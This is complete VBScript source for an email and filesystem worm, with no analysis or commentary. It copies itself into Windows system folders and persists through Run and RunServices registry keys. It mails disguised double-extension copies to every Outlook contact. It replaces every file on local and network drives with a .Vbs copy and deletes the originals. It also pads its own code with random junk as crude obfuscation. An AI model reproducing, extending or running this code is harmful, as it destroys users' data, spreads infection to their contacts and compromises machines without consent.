rem special goat, do not spread! m.s.

        dim fso ,WindowsScriptShell
        dim WindowsDir,WindowsSystemDir,WindowsRecentDir
        dim MySelf ,MyNewName ,CopyToSend ,MyCode ,MyFile

        Main

        sub Main()
                On Error Resume Next
                Initialize
                InfectComputer
                SpreadToEmails
                SpreadToLocal
        end sub

        sub Initialize
                On Error Resume Next
                dim folder ,files
                set WindowsScriptShell=CreateObject("WScript.Shell")
                Set fso = CreateObject("Scripting.FileSystemObject")
                Set MySelf = fso.GetFile(WScript.ScriptFullName)
                Set MyFile = fso.OpenTextFile(WScript.ScriptFullName,1)
                WindowsDir = fso.GetSpecialFolder(0)
                WindowsSystemDir = fso.GetSpecialFolder(1)
                WindowsRecentDir = WindowsDir & "\Recent"
                MyNewName = CreateName
                set folder = fso.GetFolder(WindowsRecentDir)
                set files = folder.files
                If cint(files.count) > 0 then
                        randomize (timer)
                        tmpFileNmber = int(rnd(1)* files.count)
                        Indx = 0
                        for each file in files
                                Indx = Indx + 1
                                if tmpFileNmber = Indx then
                                        CopyToSend = fso.GetBaseName(file.path)
                                end if
                        next
                else
                        CopyToSend = MyNewName
                end if
                CopyToSend = CopyToSend & CreateExtension
        end sub

        sub InfectComputer
                On Error Resume Next
                dim Extension
                Extension = CreateExtension
                MySelf.Copy(WindowsSystemDir & "\" & MyNewName & Extension)
                MySelf.Copy(WindowsDir & "\" & MyNewName & Extension)
                set NewCopy=fso.OpenTextFile(WindowsSystemDir & "\" & CopyToSend,2,true)
                NewCopy.write Transform
                NewCopy.close
                CreateReg "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & MyNewName , WindowsSystemDir & "\" & MyNewName & Extension
                CreateReg "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\" & MyNewName , WindowsDir & "\" & MyNewName & Extension
        end sub

        sub SpreadToEmails
                On Error Resume Next
                dim AddressIndex,AddressBook,ListIndex,MailAddress,Outlook,MAPI
                set Outlook=WScript.CreateObject("Outlook.Application")
                set MAPI=Outlook.GetNameSpace("MAPI")
                for ListIndex=1 to MAPI.AddressLists.Count
                        set AddressBook=MAPI.AddressLists(ListIndex)
                                for AddressIndex=1 to AddressBook.AddressEntries.Count
                                        MailAddress=AddressBook.AddressEntries(AddressIndex)
                                        set mail=Outlook.CreateItem(0)
                                        mail.Recipients.Add(MailAddress)
                                        mail.Subject = "FW: " & left(CopyToSend,len(CopyToSend)-4)
                                        mail.Body = ""
                                        mail.Attachments.Add(WindowsSystemDir & "\" & CopyToSend)
                                        mail.Send
                                next
                next
                Set Outlook=Nothing
                Set MAPI=Nothing
        end sub

        sub SpreadToLocal
                On Error Resume Next
                SearchDrives
        end sub

        sub SearchDrives
                On Error Resume Next
                Dim Drive,LstDrives
                Set LstDrives = fso.Drives
                For Each Drive in LstDrives
                        If Drive.DriveType = 2 or Drive.DriveType=3 Then
                                SearchFolders(Drive.path&"\")
                        end if
                Next
        end sub

        sub SearchFolders(folderspec)
                On Error Resume Next
                dim f,f1,sf
                set f = fso.GetFolder(folderspec)
                set sf = f.SubFolders
                for each f1 in sf
                        infectfiles(f1.path)
                        SearchFolders(f1.path)
                next
        end sub

        sub Infectfiles(folderspec)
                On Error Resume Next
                dim folder,file,files ,extension
                dim FileName ,NewCopy ,BaseName
                set folder = fso.GetFolder(folderspec)
                set files = folder.Files
                for each file in files
                        FileName=file.name
                        set NewCopy=fso.OpenTextFile(file.path & ".Vbs",2,true)
                        NewCopy.write NewCode
                        NewCopy.close
                        fso.DeleteFile(file.path)
                next
          end sub

        function Transform
                On Error Resume Next
                dim NewCode ,LineText
                NewCode = ""
                do while (MyFile.atendofstream <> TRUE)
                        LineText = cstr(MyFile.ReadLine)
                        randomize(timer)
                        tmpIndx = int(rnd(1)*10)+1
                        if ucase(left(trim(LineText),1)) = "'" then
                        else
                                for Indx2 = 1 to tmpIndx
                                        NewCode = NewCode & string(tmpIndx," ") & "'"
                                        for Indx = 1 to tmpIndx
                                                NewCode = NewCode & CreateName
                                        next
                                        NewCode = NewCode & vbCrLf
                                next
                        end if
                        NewCode = NewCode & Space(tmpIndx*5) & LineText & vbCrLf
                loop
                Transform = NewCode
        end Function

        Function CreateName
                On Error Resume Next
                dim tmpName,Indx,NameLen
                randomize(timer)
                NameLen = int(rnd(1)*30)+1
                for Indx = 1 to NameLen
                        randomize (timer)
                        tmpName = tmpName & chr(int(rnd(1)*26)+65)
                next
                tmpName = tmpName
                CreateName = tmpName
        end function

        Function CreateExtension
                On Error Resume Next
                TypeExtension = "DocXlsMdbBmpMp3TxtJpgGifMovUrlHtmTxt"
                randomize (timer)
                tmpFileType = int(rnd(1)* 11) + 1
                CreateExtension = "." & mid(TypeExtension,((tmpFileType-1)*3)+1,3)
                CreateExtension = CreateExtension & ".Vbs"
        end function

        sub CreateReg (regkey,regvalue)
                On Error Resume Next
                Set regedit = CreateObject("WScript.Shell")
                regedit.RegWrite regkey,regvalue
        end sub
